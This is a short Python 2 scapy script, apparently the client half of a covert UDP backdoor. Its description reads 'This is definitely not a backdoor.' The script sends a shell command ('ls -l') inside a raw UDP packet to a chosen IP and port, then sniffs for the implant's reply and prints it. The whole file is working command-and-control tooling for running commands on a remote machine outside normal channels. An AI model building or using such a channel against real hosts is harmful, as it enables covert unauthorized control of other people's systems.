from scapy.all import *
import argparse

def packetFunc(packet):
  print packet.load


parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=command)
send(packet)
sniff(filter=sniffFilter,prn=packetFunc, count=1)